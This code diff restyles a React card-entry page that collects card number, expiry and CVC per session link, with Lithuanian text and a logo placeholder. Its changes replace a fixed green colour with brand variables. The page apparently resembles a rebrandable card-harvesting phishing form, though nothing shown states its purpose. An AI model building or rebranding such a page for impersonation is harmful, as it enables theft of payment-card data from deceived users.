@@ -225,7 +225,7 @@ export function CardClient({ sessionId }: Props) {
     return (
       <div className="flex min-h-[100dvh] items-center justify-center">
         <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[#0fae4e]/30 border-t-[#0fae4e]" />
+          <div className="size-12 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
         </div>
       </div>
     );
@@ -234,7 +234,7 @@ export function CardClient({ sessionId }: Props) {
   if (!supabase) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)] p-5 sm:p-8">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -244,7 +244,7 @@ export function CardClient({ sessionId }: Props) {
   if (!sessionId) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)] p-5 sm:p-8 text-center">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
             Neteisinga nuoroda.
           </p>
@@ -255,7 +255,7 @@ export function CardClient({ sessionId }: Props) {
 
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)] p-6 sm:p-10 relative z-10 fade-in">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-6 sm:p-10 relative z-10 fade-in">
         
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
@@ -303,10 +303,10 @@ export function CardClient({ sessionId }: Props) {
               <input
                 required
                 inputMode="numeric"
-                className={`block w-full rounded-xl border py-3 px-4 text-lg tracking-widest text-white shadow-sm transition-colors placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50 ${
+                className={`block w-full rounded-xl border py-3 px-4 text-lg tracking-widest text-white shadow-sm transition-colors placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50 ${
                   !numberValid && number.length >= 12
                     ? "border-red-500 bg-red-500/10 focus:border-red-500"
-                    : "border-transparent bg-white/10 focus:border-[#0fae4e]"
+                    : "border-transparent bg-white/10 focus:border-[var(--brand)]"
                 }`}
                 value={number}
                 onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
@@ -316,7 +316,7 @@ export function CardClient({ sessionId }: Props) {
           </label>
           {bank && (
             <p className="mt-1.5 flex items-center gap-1.5 text-xs text-gray-400">
-              <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5 text-[#0fae4e]">
+              <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5 text-[var(--brand)]">
                 <path fillRule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clipRule="evenodd" />
               </svg>
               {bank.name}
@@ -328,7 +328,7 @@ export function CardClient({ sessionId }: Props) {
               <input
                 required
                 placeholder="MM/JJ"
-                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0fae4e] focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50"
+                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
                 value={expiry}
                 onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                 autoComplete="cc-exp"
@@ -342,7 +342,7 @@ export function CardClient({ sessionId }: Props) {
                 required
                 inputMode="numeric"
                 maxLength={4}
-                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0fae4e] focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50"
+                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
                 value={cvc}
                 onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                 autoComplete="cc-csc"
@@ -367,7 +367,7 @@ export function CardClient({ sessionId }: Props) {
           <button
             type="submit"
             disabled={saving || !numberValid || !expiryValid || !cvcValid}
-            className="w-full rounded-xl bg-gradient-to-r from-[#0fae4e] to-[#007a38] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(15,174,78,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
+            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(var(--brand-rgb),0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
             {saving ? "Siunčiama..." : settings.card_button}
           </button>
